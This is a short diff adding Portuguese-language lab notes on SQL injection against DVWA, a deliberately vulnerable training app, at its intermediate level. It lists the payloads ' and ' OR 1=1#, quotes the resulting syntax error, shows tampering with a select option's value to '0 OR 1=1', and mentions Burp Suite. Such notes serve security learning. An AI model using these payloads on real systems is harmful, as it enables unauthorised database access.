@@ -1,0 +1,20 @@
+<DVWA>
+DVWA Security > Intermediario > Submit
+
+SQL Injection
+'
+' OR 1=1#
+
+Podemos testar:
+
+1: Colocando caracteres especiais no Código HTML
+    --> Erro: Syntax
+    --> Erro: syntax to use near '\' OR 1=1#' at line 1
+
+    Para explorar vamos colocar um valor que não existe e passar os caracteres de injeção.
+        |-> <select name="id"><option value="1">1</option><option value="2">2</option><option 
+        |-> <select name="id"><option value="0 OR 1=1">1</option><option value="2">2</option><option 
+
+2: Utilizar o BurpSuite
+
+
